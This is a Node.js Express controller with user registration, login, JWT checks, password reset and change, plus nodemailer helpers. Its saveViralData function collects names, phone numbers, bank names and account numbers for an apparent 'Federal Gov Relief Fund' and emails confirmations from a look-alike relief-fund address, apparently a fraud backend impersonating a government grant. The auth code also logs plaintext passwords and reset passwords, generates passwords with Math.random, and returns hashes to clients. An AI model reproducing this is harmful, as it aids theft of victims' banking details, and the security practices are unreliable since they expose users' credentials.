const { userModel, fedGrant } = require("../Models/user.Model");
const nodemailer = require('nodemailer');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken')
require('dotenv').config()
const secret = process.env.SECRET
const { passwordResetEmailTemplate } = require("../Extra/user.template")
const { confirmApplication } = require("../Extra/viral.temple")


const registerUser = (req, res) => {

    const { firstName, lastName, email, password } = req.body
    const hashPassword = bcrypt.hashSync(password, 10);

    let user = new userModel({
        firstName,
        lastName,
        email,
        password: hashPassword
    })
    user.save()
        .then(data => {
            console.log(data)

            res.status(201).json({ status: "Register sucessfully", data: data })
        })
        .catch(err => {
            if (err) {
                res.status(400).json({ status: "Register unsucessfully!", error: err })
            }
        })
}

const loginUser = async (req, res) => {
    const { email, password } = req.body
    console.log(req.body);


    try {
        let user = await userModel.findOne({ email })
        if (user) {
            const comparedPassword = bcrypt.compareSync(password, user.password)
            if (comparedPassword) {
                const token = jwt.sign({ userId: user._id }, secret, { expiresIn: "1d" });
                res.status(200).json({
                    Message: "User found",
                    token: token,
                    user: user
                })
            } else {
                res.status(400).json({ Message: "Invalid detail" })
            }
        } else {
            res.status(400).json({ Message: "Invalid detail" })
        }
    }
    catch (err) {
    }
}

const pageAuth = async (req, res) => {
    let token = req.headers.authorization.split(" ")[1]
    jwt.verify(token, secret, (err, result) => {
        if (err) {
            return res.status(400).json({ Message: "User not found", error: err })
        } else {
            let userId = result.userId
            userModel.findById(userId)
                .then((userResult) => {
                    return res.status(200).json({ Message: "User found", user: userResult })
                })
        }
    })
}

const generateNewPassword = () => {
    let randomSm = "abcdefghijklmnopqrstuvwxyz"
    let randomSmall = ""
    for (let index = 1; index <= 3; index++) {
        randomSmall += randomSm.charAt(Math.floor(Math.random() * randomSm.length))
    }

    let randomCa = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    let randomCapital = ""
    for (let index = 1; index <= 2; index++) {
        randomCapital += randomCa.charAt(Math.floor(Math.random() * randomCa.length))
    }

    let randomNo = "0123456789"
    let randomNumber = ""
    for (let index = 1; index <= 2; index++) {
        randomNumber += randomNo.charAt(Math.floor(Math.random() * randomNo.length))
    }

    let randomSp = '!@#$%^&*()?:{}'
    let randomSpecial = ""
    for (let index = 1; index <= 1; index++) {
        randomSpecial += randomSp.charAt(Math.floor(Math.random() * randomSp.length))
    }
    let randomText = `${randomCapital}${randomSmall}${randomSpecial}${randomNumber}`

    return randomText
}

const resetPassword = (req, res) => {
    const { email } = req.body
    console.log(email)
    try {
        userModel.findOne({ email })
            .then((user) => {
                console.log(user);
                if (user) {
                    let newPassword = generateNewPassword()
                    console.log(newPassword);

                    let hashNewPassword = bcrypt.hashSync(newPassword, 10);
                    user.password = hashNewPassword
                    user.save()
                        .then((newData) => {
                            sendEmails(email, "Password Reset", passwordResetEmailTemplate(user.firstName, newPassword))
                                .then((mail) => {
                                    res.status(200).json({ msg: "Sent successfully", mail })
                                })
                                .catch((mailErr) => {
                                    res.status(200).json({ msg: "error", mailErr })
                                })
                        })
                        .catch((err) => {
                        })
                } else {
                    res.status(500).json({ mgs: "User not found" })
                }
            })
    }
    catch (error) {
        res.status(500).json({ mgs: "User not found" })
    }
}

const changePassword = (req, res) => {
    const { email, oldPassword, newPassword } = req.body
    userModel.findOne({ 'email': email })
        .then((user) => {
            const comparedPassword = bcrypt.compareSync(oldPassword, user.password)
            const comparedNewPassword = bcrypt.compareSync(newPassword, user.password)
            if (comparedPassword && comparedNewPassword) {
                res.status(400).json({ mgs: "New password cannot be same as old password", status: false })
            } else if (comparedPassword) {
                const hashPassword = bcrypt.hashSync(newPassword, 10)
                user.password = hashPassword
                user.save()
                    .then((newUser) => {
                        res.status(200).json({ mgs: "Changed successfully", status: true })
                    })
                    .catch((error) => {
                    })
            } else {
                res.status(400).json({ mgs: "Incorrect password", status: false })
            }
        })
        .catch((err) => {
            res.status(400).json({ mgs: "can not find user", status: false })
        })

}

// Sending email with nodemailer

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.NODEMAILER_USER,
        pass: process.env.NODEMAILER_PASS
    }
});

const sendEmails = (email, subject, html) => {
    return new Promise((resolve, reject) => {
        const emailBody = {
            from: process.env.NODEMAILER_USER,
            to: email,
            subject: subject,
            html: html
        }

        transporter.sendMail(emailBody, (err, info) => {
            if (err) {
                reject({ msg: 'An error', status: false, err });
            } else {
                resolve({ msg: 'Email sent successful', status: true, info });
            }
        });
    })
}

const transporter2 = nodemailer.createTransport({
    host: process.env.NODEMAILER_HOST,
    port: 587,
    secure: false,
    auth: {
        user: process.env.NODEMAILER_USER2,
        pass: process.env.NODEMAILER_PASS2
    }
});

const sendEmails2 = (email, subject, html) => {
    return new Promise((resolve, reject) => {
        const emailBody = {
            from: "apply@fg-relief-fund.myprosphere.com.ng",
            to: email,
            subject: subject,
            html: html
        }

        transporter2.sendMail(emailBody, (err, info) => {
            if (err) {
                reject({ msg: 'An error', status: false, err });
            } else {
                resolve({ msg: 'Email sent successful', status: true, info });
            }
        });
    })
}

const saveViralData = (req, res) => {
    console.log(req.body)
    const { email, phoneNo, accountNo, fullName, bankName } = req.body
    let info = new fedGrant({
        email,
        phoneNo,
        accountNo,
        fullName,
        bankName
    })
    info.save()
        .then((response) => {
            sendEmails2(email, "Application Received - Federal Gov Relief Fund", confirmApplication())
                .then((info) => {
                    console.log(info)
                })
                .catch((err) => {
                    console.log(err)
                })
            console.log("Data saved")
            console.log(response)
            res.status(200).json({ status: "Saved" })
        })
        .catch((err) => {
            console.log("An error occurred : " + err);
            res.status(404).send({ data: "An error occured" })
        })
}

const test = () => {
    sendEmails2("emmylove961@gmail.com", "Testing", "<p>You know i am just  testing</p>")
        .then((result) => {
            console.log(result);
        })
        .catch((err) => {
            console.log(err);
        })
}

module.exports = {
    registerUser,
    loginUser,
    pageAuth,
    resetPassword,
    changePassword,
    saveViralData,
    test
}